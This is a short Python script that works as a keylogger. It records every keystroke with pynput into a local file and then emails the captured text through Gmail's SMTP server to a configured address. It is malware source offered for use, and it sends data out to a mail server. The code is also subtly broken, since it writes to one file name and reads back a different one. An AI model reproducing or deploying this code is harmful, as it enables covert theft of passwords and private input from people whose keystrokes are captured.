from pynput import keyboard

import smtplib,ssl

sender_mail = "me@domain.com"    # your email [for results]
receiver_mail = "me@domain.com"  # your email [for results]
password = "passcode"            # Enter Password here
port = 587                       # SMTP
message = """From: me@domain.com 
To: me@domain.com                         
Subject: KeyLogs
Text: Keylogs 
"""

def write(text):
    with open("keylogger.txt",'a') as f:
        f.write(text)
        f.close()


def on_key_press(Key):
    try:
        if(Key == keyboard.Key.enter):
            write("\n")
        else:
            write(Key.char)
    except AttributeError:
        if Key == keyboard.Key.backspace:
            write("\nBackspace Key Stroked\n")
        elif(Key == keyboard.Key.tab):
            write("\nTab Key Stroked\n")
        elif(Key == keyboard.Key.space):
            write(" ");
        else:
            temp = repr(Key)+" Pressed.\n"
            write(temp)
            print("\n{} Pressed\n".format(Key))

def stop_keylogger(Key):          #Stops the Keylogger.
    if(Key == keyboard.Key.esc):
        return False

with keyboard.Listener(on_press= on_key_press,on_release= stop_keylogger) as listener:
    listener.join()

with open("keylogger_data.txt",'r') as f:
    temp = f.read()
    message = message + str(temp)
    f.close()

context = ssl.create_default_context()
server = smtplib.SMTP('smtp.gmail.com', port)
server.starttls()
server.login(sender_mail,password)
server.sendmail(sender_mail,receiver_mail,message)

print("Email Sent to ",sender_mail)
server.quit()
